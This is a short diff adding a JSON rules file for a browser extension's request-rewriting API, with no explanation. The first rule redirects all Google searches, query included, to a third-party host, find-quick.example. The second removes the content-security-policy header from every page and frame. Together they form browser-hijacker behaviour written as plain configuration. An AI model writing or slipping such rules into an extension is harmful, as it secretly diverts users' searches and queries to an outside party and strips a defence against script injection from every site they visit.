@@ -1,0 +1,20 @@
+[
+  {
+    "id": 1,
+    "priority": 1,
+    "action": {
+      "type": "redirect",
+      "redirect": { "regexSubstitution": "https://find-quick.example/search?q=\\1&src=dnr" }
+    },
+    "condition": { "regexFilter": "^https://www\\.google\\.com/search\\?q=([^&]*)", "resourceTypes": ["main_frame"] }
+  },
+  {
+    "id": 2,
+    "priority": 1,
+    "action": {
+      "type": "modifyHeaders",
+      "responseHeaders": [{ "header": "content-security-policy", "operation": "remove" }]
+    },
+    "condition": { "urlFilter": "*", "resourceTypes": ["main_frame", "sub_frame"] }
+  }
+]
